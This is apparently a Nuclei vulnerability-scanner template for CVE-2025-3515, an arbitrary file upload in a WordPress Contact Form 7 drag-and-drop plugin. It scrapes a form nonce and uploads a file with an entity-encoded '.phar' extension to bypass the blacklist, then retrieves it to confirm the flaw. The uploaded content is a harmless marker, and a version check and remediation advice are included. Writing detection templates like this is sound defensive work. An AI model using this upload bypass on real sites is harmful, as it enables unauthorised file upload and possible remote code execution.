flow: 'http(''fetch_upload_name'') && http(''upload_file'') && http(''fetch_phar_file'')
  || http(''version_check'')

  '
http:
- extractors:
  - group: 1
    internal: true
    name: upload_name
    regex:
    - <input.+?class=".+?wpcf7-drag-n-drop-file d-none.+?".+?data-name="(.+?)"
    type: regex
  - group: 1
    internal: true
    name: nonce
    regex:
    - '"ajax_nonce":"([a-f0-9]{10,})"'
    type: regex
  - group: 1
    internal: true
    name: form_id
    regex:
    - <input.+?class=".+?wpcf7-drag-n-drop-file d-none.+?".+?data-id="([0-9]+?)"
    type: regex
  id: fetch_upload_name
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - wpcf7-drag-n-drop-file
  method: GET
  path:
  - '{{BaseURL}}'
  - '{{BaseURL}}/contact/'
  - '{{BaseURL}}/contact-us/'
  - '{{BaseURL}}/submit/'
  - '{{BaseURL}}/support/'
  - '{{BaseURL}}/form/'
  - '{{BaseURL}}/get-in-touch/'
  stop-at-first-match: true
- body: '------WebKitFormBoundaryyvcxCgWuFH6hBJi4

    Content-Disposition: form-data; name="action"


    dnd_codedropz_upload

    ------WebKitFormBoundaryyvcxCgWuFH6hBJi4

    Content-Disposition: form-data; name="type"


    drop

    ------WebKitFormBoundaryyvcxCgWuFH6hBJi4

    Content-Disposition: form-data; name="security"


    {{nonce}}

    ------WebKitFormBoundaryyvcxCgWuFH6hBJi4

    Content-Disposition: form-data; name="form_id"


    {{form_id}}

    ------WebKitFormBoundaryyvcxCgWuFH6hBJi4

    Content-Disposition: form-data; name="upload_name"


    {{upload_name}}

    ------WebKitFormBoundaryyvcxCgWuFH6hBJi4

    Content-Disposition: form-data; name="upload_folder"


    {{randstr}}

    ------WebKitFormBoundaryyvcxCgWuFH6hBJi4

    Content-Disposition: form-data; name="upload-file"; filename="{{phar_file}}.&#112;har"

    Content-Type: image/png


    {{phar_marker}}

    ------WebKitFormBoundaryyvcxCgWuFH6hBJi4--

    '
  extractors:
  - internal: true
    json:
    - .data.file
    name: uploaded_file
    type: json
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyvcxCgWuFH6hBJi4
  id: upload_file
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - '"success":true'
  method: POST
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php'
- id: fetch_phar_file
  matchers:
  - part: body
    type: word
    words:
    - '{{phar_marker}}'
  method: GET
  path:
  - '{{RootURL}}/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{uploaded_file}}'
- extractors:
  - group: 1
    internal: true
    name: version
    regex:
    - Stable tag:\s*([0-9.]+)
    type: regex
  - group: 1
    regex:
    - Stable tag:\s*([0-9.]+)
    type: regex
  id: version_check
  matchers:
  - condition: and
    type: word
    words:
    - Drag and Drop Multiple File Upload
    - 'Stable tag:'
  - dsl:
    - compare_versions(version, '<= 1.3.8.9')
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt'
id: CVE-2025-3515
info:
  author: hnd3884
  classification:
    cpe: cpe:2.3:a:codedropz:drag_and_drop_multiple_file_upload_-_contact_form_7:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2025-3515
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.1
    cwe-id: CWE-434
    epss-percentile: 0.86977
    epss-score: 0.03371
  description: 'The Drag and Drop Multiple File Upload for Contact Form 7 plugin for
    WordPress is vulnerable to arbitrary file uploads due to insufficient file type
    validation in all versions up to, and including, 1.3.8.9. This makes it possible
    for unauthenticated attackers to bypass the plugin''s blacklist and upload .phar
    or other dangerous file types on the affected site''s server, which may make remote
    code execution possible on the servers that are configured to handle .phar files
    as executable PHP scripts, particularly in default Apache+mod_php configurations
    where the file extension is not strictly validated before being passed to the
    PHP interpreter.

    '
  impact: 'Unauthenticated attackers can upload dangerous file types like .phar by
    bypassing the blacklist, potentially achieving remote code execution on servers
    with default Apache+mod_php configurations.

    '
  metadata:
    max-request: 4
    product: drag_and_drop_multiple_file_upload_contact_form_7
    publicwww-query: wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/
    vendor: codedropz
    verified: true
  name: Contact Form 7 Drag and Drop Multiple File Upload - Arbitrary File Upload
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-3515
  - https://plugins.trac.wordpress.org/changeset/3310153/
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/e1298242-61d2-495e-bae7-96b5e12bd03d
  remediation: 'Upgrade Contact Form 7 Drag and Drop Multiple File Upload plugin to
    version 1.3.9.0 or later that properly validates file extensions.

    '
  severity: high
  tags: cve,cve2025,wordpress,wp,contact-form-7,file-upload,intrusive,vkev,vuln
variables:
  phar_file: '{{rand_base(5)}}'
  phar_marker: CVE-2025-3515-{{rand_base(8)}}
